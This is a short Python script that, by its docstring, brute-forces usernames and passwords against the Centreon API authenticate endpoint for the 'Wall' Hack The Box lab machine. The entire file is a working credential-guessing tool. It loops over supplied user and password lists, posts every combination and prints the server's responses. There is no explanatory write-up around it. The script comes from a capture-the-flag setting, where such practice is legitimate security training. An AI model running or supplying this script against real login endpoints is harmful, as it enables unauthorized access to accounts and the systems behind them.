#!/usr/bin/env python3
"""Interacts with the Centreon API to 
find valid credentials for the wall Hack The Box
machine."""

import itertools
import requests
import sys

user_file = sys.argv[1]
password_file = sys.argv[2]
api_url = sys.argv[3]

# open user and password files
with open(user_file, 'r') as user_fd:
    users = user_fd.read().splitlines()
with open(password_file, 'r') as pass_fd:
    passwords = pass_fd.read().splitlines()

for u in users:
    for p in passwords:
        authenticate_url = api_url + "index.php?action=authenticate"
        post_data = {'username': u,
                     'password': p
                    }
        response = requests.post(authenticate_url, data=post_data)
        print("%s:%s - %s" % (u, p, response.text))
